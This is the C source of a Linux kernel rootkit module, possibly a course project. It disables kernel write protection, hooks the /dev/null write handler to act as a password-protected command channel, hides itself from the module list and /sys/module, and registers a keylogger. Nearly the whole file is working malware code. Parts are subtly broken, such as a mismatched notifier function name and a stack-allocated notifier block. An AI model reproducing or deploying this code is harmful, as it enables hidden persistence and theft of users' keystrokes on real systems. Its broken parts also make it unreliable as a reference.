#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/list.h>
#include <linux/fs.h>
#include <linux/slab.h>
#include <linux/string.h>
#include <linux/notifier.h>
#include <linux/keyboard.h>
#include <linux/console.h>

#define DISABLE_W_PROTECTED_MEMORY \
    do { \
        preempt_disable(); \
        write_cr0(read_cr0() & (~ 0x10000)); \
    } while (0);
#define ENABLE_W_PROTECTED_MEMORY \
    do { \
        preempt_enable(); \
        write_cr0(read_cr0() | 0x10000); \
    } while (0);

MODULE_LICENSE("MIT");
MODULE_AUTHOR("SAV");

#define PASSWORD "HohoHaha"
#define CMD_HIDE_ROOTKIT "hide"
#define CMD_UNHIDE_ROOTKIT "unhide"
#define CMD1 "cmd1"

struct hook {
  void *original_function;
  void *modified_function;
  void **modified_at;
  struct list_head list;
};

LIST_HEAD(hook_list);

void hook_add(void **modified_at, void *modified_function) {
  struct hook *h = kmalloc(sizeof(struct hook), GFP_KERNEL);
  if(!h) {
    return ;
  }

  h->modified_at = modified_at;
  h->modified_function = modified_function;
  h->original_function = (void *) (*modified_at);
  list_add(&h->list, &hook_list);
}

void hook_patch(void *modified_function) {
  struct hook *h;

  list_for_each_entry(h, &hook_list, list) {
    if(h->modified_function == modified_function) {
      DISABLE_W_PROTECTED_MEMORY
      *(h->modified_at) = h->modified_function;
      ENABLE_W_PROTECTED_MEMORY
      break;
    }
  }
}

void *hook_unpatch(void *modified_function) {
  struct hook *h;

  list_for_each_entry(h, &hook_list, list) {
    if(h->modified_function == modified_function) {
      DISABLE_W_PROTECTED_MEMORY
      *(h->modified_at) = h->original_function;
      ENABLE_W_PROTECTED_MEMORY
      return h->original_function;
    }
  }

  return NULL;
}

void hook_remove(void *modified_function) {
  struct hook *h, *tmp;

  list_for_each_entry_safe(h, tmp, &hook_list, list) {
    if(h->modified_function == modified_function) {
      hook_unpatch(modified_function);
      list_del(&h->list);
      kfree(h);
    }
  }
}

struct file_operations *get_fops(char *path) {
  struct file *filep;
  if((filep = filp_open(path, O_RDONLY, 0)) == NULL) {
    return NULL;
  }
  struct file_operations *fop;
  fop = (struct file_operations *) filep->f_op;
  filp_close(filep, 0);

  return fop;
}

void cns_rootkit_unhide(void);
void cns_rootkit_hide(void);

void command_execute(char __user *buf, size_t count) {
  if(count <= sizeof(PASSWORD)) {
    printk(KERN_INFO "cns-rootkit: Command is too small %lu\n", sizeof(PASSWORD));
    return;
  }

  if(strncmp(buf, PASSWORD, sizeof(PASSWORD) - 1) != 0) {
    printk(KERN_INFO "cns-rootkit: Password failed %d\n", strncmp(buf, PASSWORD, sizeof(PASSWORD)));
    return;
  }

  printk(KERN_INFO "cns-rootkit: command password passed\n");

  buf += (sizeof(PASSWORD) - 1);

  if(strncmp(buf, CMD1, sizeof(CMD1) - 1) == 0) {
    printk(KERN_INFO "cns-rootkit: got command1\n");
    // call some function here
    //cns_rootkit_unhide();
  } else if(strncmp(buf, CMD_HIDE_ROOTKIT, sizeof(CMD_HIDE_ROOTKIT) - 1) == 0) {
    printk(KERN_INFO "cns-rootkit: got command HIDE\n");
    cns_rootkit_hide();
    return;
  } else if(strncmp(buf, CMD_UNHIDE_ROOTKIT, sizeof(CMD_UNHIDE_ROOTKIT) - 1) == 0) {
    printk(KERN_INFO "cns-rootkit: got command UNHIDE\n");
    cns_rootkit_unhide();
    return;
  } else {
    printk(KERN_INFO "cns-rootkit: got unknown command\n");
  }
}

ssize_t cns_rootkit_dev_null_write(struct file *filep, char __user *buf, size_t count, loff_t *p) {
  printk(KERN_INFO "cns-rootkit: In my /dev/null hook with length %lu\n", count);
  command_execute(buf, count);
  ssize_t (*original_dev_null_write) (struct file *filep, char __user *buf, size_t count, loff_t *p);
  original_dev_null_write = hook_unpatch((void *) cns_rootkit_dev_null_write);
  ssize_t res =  original_dev_null_write(filep, buf, count, p);
  hook_patch((void *) cns_rootkit_dev_null_write);

  return res;
}

int establish_comm_channel(void) {
  printk(KERN_INFO "cns-rootkit: Attempting to establish communication channel\n");
  struct file_operations *dev_null_fop = get_fops("/dev/null");

  hook_add((void **)(&(dev_null_fop->write)), (void *)cns_rootkit_dev_null_write);
  hook_patch((void *) cns_rootkit_dev_null_write);

  printk(KERN_INFO "cns-rootkit: Successfully established communication channel\n");
  return 0;
}

int unestablish_comm_channel(void) {
  printk(KERN_INFO "cns-rootkit: Attempting to unestablish communication channel\n");

  hook_remove((void *) cns_rootkit_dev_null_write);

  printk(KERN_INFO "cns-rootkit: Successfully unestablished communication channel\n");
  return 0;
}

int (*old_filldir)(struct dir_context *, const char *, int, loff_t, u64, unsigned);

int cns_rootkit_sys_module_filldir(struct dir_context *ctx, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type) {
  if(strncmp(name, "cns_rootkit", namelen) == 0) {
    return 0;
  } else {
    return old_filldir(ctx, name, namelen, offset, ino, d_type);
  }
}

int cns_rootkit_sys_module_iterate(struct file *filep, struct dir_context *ctx) {
  //struct dir_context new_ctx = {.actor = cns_rootkit_sys_module_filldir, .pos = ctx->pos};
  old_filldir = ctx->actor;
  *((filldir_t *)&ctx->actor) = cns_rootkit_sys_module_filldir;
  int (*old_iterate)(struct file *, struct dir_context *);
  old_iterate = hook_unpatch(cns_rootkit_sys_module_iterate);
  int res = old_iterate(filep, ctx);
  hook_patch(cns_rootkit_sys_module_iterate);
  return res;
}

struct list_head *module_list;
int is_hidden = 0;

void cns_rootkit_hide(void)
{
    if (is_hidden) {
        return;
    }

    module_list = THIS_MODULE->list.prev;

    list_del(&THIS_MODULE->list);

    struct file_operations *sys_module_fop = get_fops("/sys/module/");

    hook_add((void **)(&(sys_module_fop->iterate)), (void *)cns_rootkit_sys_module_iterate);
    hook_patch((void *) cns_rootkit_sys_module_iterate);

    is_hidden = 1;
}


void cns_rootkit_unhide(void)
{
    if (!is_hidden) {
        return;
    }

    list_add(&THIS_MODULE->list, module_list);

    hook_remove((void *) cns_rootkit_sys_module_iterate);

    is_hidden = 0;
}

int cns_keyboard_notifier(struct notifier_block *nb, unsigned long action, void *_data) {
  struct keyboard_notifier_param *data = (struct keyboard_notifier_param*)_data;
  struct vc_data *vc = data->vc;

  if(action == KBD_KEYCODE) {
    printk(KERN_INFO "cns-rootkit: Keylogger %i %s\n", data->value, (data->down ? "down" : "up"));
  }

  return NOTIFY_OK;
}

void cns_rootkit_register_keylogger(void) {
  struct notifier_block cns_kb_notifier_block = {
    .notifier_call = cns_kb_notifier
  };

  register_keyboard_notifier(&cns_kb_notifier_block);
}


static int cns_rootkit_init(void) {
  printk(KERN_INFO "cns-rootkit: Init\n");
  cns_rootkit_hide();
  if(establish_comm_channel() < 0) {
    printk(KERN_INFO "cns-rootkit: Failed to establish communication channel\n");
  }
  cns_rootkit_register_keylogger();
  return 0;
}

static void cns_rootkit_exit(void) {
  unestablish_comm_channel();

  printk(KERN_INFO "cns-rootkit: Exit\n");

}

module_init(cns_rootkit_init);
module_exit(cns_rootkit_exit);
